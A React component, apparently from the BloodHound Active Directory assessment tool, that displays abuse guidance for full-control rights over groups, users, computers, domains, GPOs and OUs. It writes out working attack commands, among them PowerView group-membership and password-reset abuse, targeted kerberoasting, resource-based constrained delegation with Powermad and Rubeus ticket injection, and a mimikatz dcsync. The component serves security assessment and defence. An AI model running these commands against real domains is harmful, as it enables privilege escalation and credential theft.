import React from 'react';
import PropTypes from 'prop-types';

const WindowsAbuse = ({
    sourceName,
    sourceType,
    targetName,
    targetType,
    targetId,
    haslaps,
}) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <p>
                        Full control of a group allows you to directly modify
                        group membership of the group.
                    </p>

                    <p>
                        There are at least two ways to execute this attack. The
                        first and most obvious is by using the built-in net.exe
                        binary in Windows (e.g.: net group "Domain Admins"
                        harmj0y /add /domain). See the opsec considerations tab
                        for why this may be a bad idea. The second, and highly
                        recommended method, is by using the
                        Add-DomainGroupMember function in PowerView. This
                        function is superior to using the net.exe binary in
                        several ways. For instance, you can supply alternate
                        credentials, instead of needing to run a process as or
                        logon as the user with the AddMember privilege.
                        Additionally, you have much safer execution options than
                        you do with spawning net.exe (see the opsec tab).
                    </p>

                    <p>
                        To abuse this privilege with PowerView's
                        Add-DomainGroupMember, first import PowerView into your
                        agent session or into a PowerShell instance at the
                        console. You may need to authenticate to the Domain
                        Controller as{' '}
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Add-DomainGroupMember,
                        first create a PSCredential object (these examples comes
                        from the PowerView help documentation):
                    </p>

                    <pre>
                        <code>
                            {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                                "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                        </code>
                    </pre>

                    <p>
                        Then, use Add-DomainGroupMember, optionally specifying
                        $Cred if you are not already running a process as{' '}
                        {sourceName}:
                    </p>

                    <pre>
                        <code>
                            {
                                "Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"
                            }
                        </code>
                    </pre>

                    <p>
                        Finally, verify that the user was successfully added to
                        the group with PowerView's Get-DomainGroupMember:
                    </p>

                    <pre>
                        <code>
                            {"Get-DomainGroupMember -Identity 'Domain Admins'"}
                        </code>
                    </pre>
                </>
            );
        case 'User':
            return (
                <>
                    <p>
                        Full control of a user allows you to modify properties
                        of the user to perform a targeted kerberoast attack, and
                        also grants the ability to reset the password of the
                        user without knowing their current one.
                    </p>

                    <h4> Targeted Kerberoast </h4>

                    <p>
                        A targeted kerberoast attack can be performed using
                        PowerView's Set-DomainObject along with
                        Get-DomainSPNTicket.
                    </p>

                    <p>
                        You may need to authenticate to the Domain Controller as{' '}
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Set-DomainObject, first
                        create a PSCredential object (these examples comes from
                        the PowerView help documentation):
                    </p>

                    <pre>
                        <code>
                            {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                                "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                        </code>
                    </pre>

                    <p>
                        Then, use Set-DomainObject, optionally specifying $Cred
                        if you are not already running a process as {sourceName}
                        :
                    </p>

                    <pre>
                        <code>
                            {
                                "Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"
                            }
                        </code>
                    </pre>

                    <p>
                        After running this, you can use Get-DomainSPNTicket as
                        follows:
                    </p>

                    <pre>
                        <code>
                            {
                                'Get-DomainSPNTicket -Credential $Cred harmj0y | fl'
                            }
                        </code>
                    </pre>

                    <p>
                        The recovered hash can be cracked offline using the tool
                        of your choice. Cleanup of the ServicePrincipalName can
                        be done with the Set-DomainObject command:
                    </p>

                    <pre>
                        <code>
                            {
                                'Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname'
                            }
                        </code>
                    </pre>

                    <h4> Force Change Password </h4>

                    <p>
                        There are at least two ways to execute this attack. The
                        first and most obvious is by using the built-in net.exe
                        binary in Windows (e.g.: net user dfm.a Password123!
                        /domain). See the opsec considerations tab for why this
                        may be a bad idea. The second, and highly recommended
                        method, is by using the Set-DomainUserPassword function
                        in PowerView. This function is superior to using the
                        net.exe binary in several ways. For instance, you can
                        supply alternate credentials, instead of needing to run
                        a process as or logon as the user with the
                        ForceChangePassword privilege. Additionally, you have
                        much safer execution options than you do with spawning
                        net.exe (see the opsec tab).
                    </p>

                    <p>
                        To abuse this privilege with PowerView's
                        Set-DomainUserPassword, first import PowerView into your
                        agent session or into a PowerShell instance at the
                        console. You may need to authenticate to the Domain
                        Controller as{' '}
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Set-DomainUserPassword,
                        first create a PSCredential object (these examples comes
                        from the PowerView help documentation):
                    </p>

                    <pre>
                        <code>
                            {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                                "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                        </code>
                    </pre>

                    <p>
                        Then create a secure string object for the password you
                        want to set on the target user:
                    </p>

                    <pre>
                        <code>
                            {
                                "$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"
                            }
                        </code>
                    </pre>

                    <p>
                        Finally, use Set-DomainUserPassword, optionally
                        specifying $Cred if you are not already running a
                        process as {sourceName}:
                    </p>

                    <pre>
                        <code>
                            {
                                'Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred'
                            }
                        </code>
                    </pre>

                    <p>
                        Now that you know the target user's plain text password,
                        you can either start a new agent as that user, or use
                        that user's credentials in conjunction with PowerView's
                        ACL abuse functions, or perhaps even RDP to a system the
                        target user has access to. For more ideas and
                        information, see the references tab.
                    </p>
                </>
            );
        case 'Computer':
            if (haslaps) {
                return (
                    <>
                        <p>
                            Full control of a computer object is abusable when
                            the computer's local admin account credential is
                            controlled with LAPS. The clear-text password for
                            the local administrator account is stored in an
                            extended attribute on the computer object called
                            ms-Mcs-AdmPwd. With full control of the computer
                            object, you may have the ability to read this
                            attribute, or grant yourself the ability to read the
                            attribute by modifying the computer object's
                            security descriptor.
                        </p>

                        <p>
                            Alternatively, Full control of a computer object can
                            be used to perform a resource based constrained
                            delegation attack.
                        </p>

                        <p>
                            Abusing this primitive is possible
                            through the Rubeus project.
                        </p>

                        <p>
                            First, if an attacker does not control an account
                            with an SPN set, Kevin Robertson's Powermad project
                            can be used to add a new attacker-controlled
                            computer account:
                        </p>

                        <pre>
                            <code>
                                {
                                    "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
                                }
                            </code>
                        </pre>

                        <p>
                            PowerView can be used to then retrieve the security
                            identifier (SID) of the newly created computer
                            account:
                        </p>

                        <pre>
                            <code>
                                $ComputerSid = Get-DomainComputer attackersystem
                                -Properties objectsid | Select -Expand objectsid
                            </code>
                        </pre>

                        <p>
                            We now need to build a generic ACE with the
                            attacker-added computer SID as the principal, and
                            get the binary bytes for the new DACL/ACE:
                        </p>

                        <pre>
                            <code>
                                {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' +
                                    '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
                                    '$SD.GetBinaryForm($SDBytes, 0)'}
                            </code>
                        </pre>

                        <p>
                            Next, we need to set this newly created security
                            descriptor in the
                            msDS-AllowedToActOnBehalfOfOtherIdentity field of
                            the comptuer account we're taking over, again using
                            PowerView in this case:
                        </p>

                        <pre>
                            <code>
                                {
                                    "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
                                }
                            </code>
                        </pre>

                        <p>
                            We can then use Rubeus to hash the plaintext
                            password into its RC4_HMAC form:
                        </p>

                        <pre>
                            <code>
                                {'Rubeus.exe hash /password:Summer2018!'}
                            </code>
                        </pre>

                        <p>
                            And finally we can use Rubeus' *s4u* module to get a
                            service ticket for the service name (sname) we want
                            to "pretend" to be "admin" for. This ticket is
                            injected (thanks to /ptt), and in this case grants
                            us access to the file system of the TARGETCOMPUTER:
                        </p>

                        <pre>
                            <code>
                                {
                                    'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
                                }
                            </code>
                        </pre>
                    </>
                );
            } else {
                return (
                    <>
                        <p>
                            Full control of a computer object can be used to
                            perform a resource based constrained delegation
                            attack.
                        </p>

                        <p>
                            Abusing this primitive is possible
                            through the Rubeus project.
                        </p>

                        <p>
                            First, if an attacker does not control an account
                            with an SPN set, Kevin Robertson's Powermad project
                            can be used to add a new attacker-controlled
                            computer account:
                        </p>

                        <pre>
                            <code>
                                {
                                    "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
                                }
                            </code>
                        </pre>

                        <p>
                            PowerView can be used to then retrieve the security
                            identifier (SID) of the newly created computer
                            account:
                        </p>

                        <pre>
                            <code>
                                {
                                    '$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'
                                }
                            </code>
                        </pre>

                        <p>
                            We now need to build a generic ACE with the
                            attacker-added computer SID as the principal, and
                            get the binary bytes for the new DACL/ACE:
                        </p>

                        <pre>
                            <code>
                                {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' +
                                    '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
                                    '$SD.GetBinaryForm($SDBytes, 0)'}
                            </code>
                        </pre>

                        <p>
                            Next, we need to set this newly created security
                            descriptor in the
                            msDS-AllowedToActOnBehalfOfOtherIdentity field of
                            the comptuer account we're taking over, again using
                            PowerView in this case:
                        </p>

                        <pre>
                            <code>
                                {
                                    "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
                                }
                            </code>
                        </pre>

                        <p>
                            We can then use Rubeus to hash the plaintext
                            password into its RC4_HMAC form:
                        </p>

                        <pre>
                            <code>
                                {'Rubeus.exe hash /password:Summer2018!'}
                            </code>
                        </pre>

                        <p>
                            And finally we can use Rubeus' *s4u* module to get a
                            service ticket for the service name (sname) we want
                            to "pretend" to be "admin" for. This ticket is
                            injected (thanks to /ptt), and in this case grants
                            us access to the file system of the TARGETCOMPUTER:
                        </p>

                        <pre>
                            <code>
                                {
                                    'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
                                }
                            </code>
                        </pre>
                    </>
                );
            }
        case 'Domain':
            return (
                <>
                    <p>
                        Full control of a domain object grants you both
                        DS-Replication-Get-Changes as well as
                        DS-Replication-Get-Changes-All rights. The combination
                        of these rights allows you to perform the dcsync attack
                        using mimikatz. To grab the credential of the user
                        harmj0y using these rights:
                    </p>

                    <pre>
                        <code>
                            {
                                'lsadump::dcsync /domain:testlab.local /user:harmj0y'
                            }
                        </code>
                    </pre>
                </>
            );
        case 'GPO':
            return (
                <>
                    <p>
                        With full control of a GPO, you may make modifications
                        to that GPO which will then apply to the users and
                        computers affected by the GPO. Select the target object
                        you wish to push an evil policy down to, then use the
                        gpedit GUI to modify the GPO, using an evil policy that
                        allows item-level targeting, such as a new immediate
                        scheduled task. Then wait for the group
                        policy client to pick up and execute the new evil
                        policy. See the references tab for a more detailed write
                        up on this abuse.
                    </p>
                </>
            );
        case 'OU':
            return (
                <>
                    <h4>Control of the Organization Unit</h4>

                    <p>
                        With full control of the OU, you may add a new ACE on
                        the OU that will inherit down to the objects under that
                        OU. Below are two options depending on how targeted you
                        choose to be in this step:
                    </p>

                    <h4>Generic Descendent Object Takeover</h4>
                    <p>
                        The simplest and most straight forward way to abuse
                        control of the OU is to apply a GenericAll ACE on the OU
                        that will inherit down to all object types. Again, this
                        can be done using PowerView. This time we will use the
                        New-ADObjectAccessControlEntry, which gives us more
                        control over the ACE we add to the OU.
                    </p>

                    <p>
                        First, we need to reference the OU by its ObjectGUID,
                        not its name. The ObjectGUID for the OU {targetName} is:{' '}
                        {targetId}.
                    </p>

                    <p>
                        Next, we will fetch the GUID for all objects. This
                        should be '00000000-0000-0000-0000-000000000000':
                    </p>

                    <pre>
                        <code>
                            {'$Guids = Get-DomainGUIDMap\n' +
                                "$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name"}
                        </code>
                    </pre>

                    <p>
                        Then we will construct our ACE. This command will create
                        an ACE granting the "JKHOLER" user full control of all
                        descendant objects:
                    </p>

                    <pre>
                        <code>
                            {
                                "$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"
                            }
                        </code>
                    </pre>

                    <p>Finally, we will apply this ACE to our target OU:</p>

                    <pre>
                        <code>
                            {'$OU = Get-DomainOU -Raw (OU GUID)\n' +
                                '$DsEntry = $OU.GetDirectoryEntry()\n' +
                                "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n" +
                                '$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n' +
                                '$dsEntry.PsBase.CommitChanges()'}
                        </code>
                    </pre>

                    <p>
                        Now, the "JKOHLER" user will have full control of all
                        descendent objects of each type.
                    </p>

                    <h4>Targeted Descendent Object Takeoever</h4>

                    <p>
                        If you want to be more targeted with your approach, it
                        is possible to specify precisely what right you want to
                        apply to precisely which kinds of descendent objects.
                        You could, for example, grant a user
                        "ForceChangePassword" privilege against all user
                        objects, or grant a security group the ability to read
                        every GMSA password under a certain OU. Below is an
                        example taken from PowerView's help text on how to grant
                        the "ITADMIN" user the ability to read the LAPS password
                        from all computer objects in the "Workstations" OU:
                    </p>

                    <pre>
                        <code>
                            {'$Guids = Get-DomainGUIDMap\n' +
                                "$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name\n" +
                                "$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name\n" +
                                '$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid\n' +
                                '$OU = Get-DomainOU -Raw Workstations\n' +
                                '$DsEntry = $OU.GetDirectoryEntry()\n' +
                                "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n" +
                                '$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n' +
                                '$dsEntry.PsBase.CommitChanges()'}
                        </code>
                    </pre>
                </>
            );
    }
    return <></>;
};

WindowsAbuse.propTypes = {
    sourceName: PropTypes.string,
    sourceType: PropTypes.string,
    targetName: PropTypes.string,
    targetType: PropTypes.string,
    targetId: PropTypes.string,
    haslaps: PropTypes.bool,
};
export default WindowsAbuse;
